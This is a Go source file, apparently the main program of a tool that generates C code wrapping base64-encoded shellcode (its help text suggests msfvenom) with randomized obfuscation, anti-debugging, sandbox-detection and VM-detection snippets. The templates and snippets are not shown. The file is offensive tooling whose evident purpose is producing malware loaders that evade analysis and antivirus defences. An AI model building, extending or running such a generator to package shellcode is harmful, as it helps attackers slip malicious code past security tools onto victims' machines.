package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"log"
)

var workingDir *string

func main() {
	numVariants := make(map[SnippetType]*int)
	numVariants[SNPT_TYPE_OBF] = flag.Int("obfs", 5, "Number of variants for obfuscation snippets")
	numVariants[SNPT_TYPE_DBG] = flag.Int("dbgs", 5, "Number of variants for anti-debug snippets")
	numVariants[SNPT_TYPE_SND] = flag.Int("snds", 5, "Number of variants for sandbox detection snippets")
	numVariants[SNPT_TYPE_VM] = flag.Int("vms", 5, "Number of variants for VM detection snippets")

	tpl := flag.String("tpl", "", "C file with a template for processing")
	workingDir = flag.String("dir", ".", "Working directory with the 'tpls' folder. May be useful if the binary is called from another location")
	shell := flag.String("shell", "", "Base64 string with shellcode. Use 'msfvenom -f base64 ...' to generate")
	maxAsmOps := flag.Int("ops", 5, "Max count of random operations for ASM snippet")

	flag.Parse()

	if *tpl == "" {
		log.Fatal("Missing required -tpl argument")
	}

	if *maxAsmOps < 0 || *maxAsmOps > 64 {
		log.Fatal("Optional argument -ops should be in range 0..64")
	}

	for typ, num := range numVariants {
		if *num < 1 || *num > 16 {
			log.Fatalf("Optional argument -%ss should be in range 1..16", typ)
		}
	}

	var shellcode []byte
	if *shell == "" {
		shellcode = []byte{}
	} else {
		var err error
		shellcode, err = base64.StdEncoding.DecodeString(*shell)
		if err != nil {
			log.Fatal("Optional argument -shell does not contain Base64 string")
		}
	}

	table := make(map[string]SnippetsMap)
	for _, typ := range snippetTypes {
		var tpls []*Template
		if typ == SNPT_TYPE_OBF {
			tpls = loadObfTpls()
		} else {
			tpls = loadTpls(typ, LANG_ASM)
			tpls = append(tpls, loadTpls(typ, LANG_C)...)
		}
		table[typ.String()] = loadSnippets(tpls, typ, *numVariants[typ], *maxAsmOps)
	}

	code := generateCode(loadFile(*tpl), table, shellcode)
	fmt.Print(code)
}
